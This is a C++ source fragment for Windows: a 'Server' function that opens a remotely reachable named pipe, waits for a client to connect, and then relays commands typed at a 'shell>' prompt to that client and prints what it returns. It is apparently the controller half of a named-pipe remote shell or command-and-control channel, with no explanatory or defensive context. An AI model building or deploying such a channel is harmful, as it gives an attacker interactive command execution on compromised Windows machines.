


bool Server(CHAR* NamedPipeName) {
	HANDLE hNamedPipe = ::CreateNamedPipeA(NamedPipeName, PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,
		PIPE_UNLIMITED_INSTANCES, DATA_BUFFER_SIZE, DATA_BUFFER_SIZE, 5, NULL);

	if (hNamedPipe == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to create named pipe.\n");
		return 1;
	}
	printf("[+] Named pipe created successfully. Listening...\n\n");

	::ConnectNamedPipe(hNamedPipe, NULL);

	CHAR cmd[DATA_BUFFER_SIZE];
	DWORD send = DATA_BUFFER_SIZE;
	CHAR result[DATA_BUFFER_SIZE];
	DWORD recv = DATA_BUFFER_SIZE;

	if (!::ReadFile(hNamedPipe, result, DATA_BUFFER_SIZE, &recv, NULL) || recv == 0) {
		if (::GetLastError() == ERROR_BROKEN_PIPE) {
			printf("[-] Client disconnected.\n");
		}
		else {
			printf("[-] Error reading from pipe.\n");
		}
	}
	else {
		printf("[+] Got connection from Client : %s\n\n", result);
	}

	while (true) {
		::ZeroMemory(cmd, DATA_BUFFER_SIZE);
		printf("shell> ");
		::scanf_s("%[^\n]s", &cmd);
		getchar();

		if (!::WriteFile(hNamedPipe, cmd, DATA_BUFFER_SIZE, &send, NULL)) {
			printf("[-] Failed to send result or disconnected.\n\n");
			continue;
		}

		if (strcmp("exit", cmd) == 0) break;

		::ZeroMemory(result, DATA_BUFFER_SIZE);
		if (!::ReadFile(hNamedPipe, result, DATA_BUFFER_SIZE, &recv, NULL) || recv == 0) {
			if (::GetLastError() == ERROR_BROKEN_PIPE) {
				printf("[-] Client disconnected.\n");
				break;
			}
			else {
				printf("[-] Error reading from pipe.\n");
			}
		}
		else {
			printf("%s\n", result);
		}
	}

	::DisconnectNamedPipe(hNamedPipe);
	::CloseHandle(hNamedPipe);
	return 0;
}